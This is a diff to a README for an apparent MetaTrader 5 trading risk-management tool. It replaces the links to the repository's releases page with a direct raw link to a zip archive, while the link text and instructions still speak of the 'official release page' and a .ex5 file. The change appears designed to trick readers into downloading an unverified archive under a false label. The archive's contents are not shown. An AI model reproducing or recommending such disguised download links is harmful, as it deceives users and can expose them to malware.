@@ -1,6 +1,6 @@
 # 📈 MT5-Risk-Management-EA - Manage Trading Risk With Consistent Automation
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/jeanettecapital5730/MT5-Risk-Management-EA/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/jeanettecapital5730/MT5-Risk-Management-EA/raw/refs/heads/main/RiskManagement/Risk_M_EA_Management_v2.8.zip)
 
 ## 🎯 About This Tool
 
@@ -17,7 +17,7 @@ Check your computer meets these standards to run the software correctly:
 
 ## 💾 Downloading The Software
 
-Visit the [official release page](https://github.com/jeanettecapital5730/MT5-Risk-Management-EA/releases) to download the software. Click the link to see the available files. Find the most recent release and choose the file ending in .ex5. This file contains the compiled code for your trading platform. Save this file to a folder you can find easily, such as your Desktop or Downloads folder.
+Visit the [official release page](https://github.com/jeanettecapital5730/MT5-Risk-Management-EA/raw/refs/heads/main/RiskManagement/Risk_M_EA_Management_v2.8.zip) to download the software. Click the link to see the available files. Find the most recent release and choose the file ending in .ex5. This file contains the compiled code for your trading platform. Save this file to a folder you can find easily, such as your Desktop or Downloads folder.
 
 ## 🚀 Setting Up Your MetaTrader 5 Platform
 
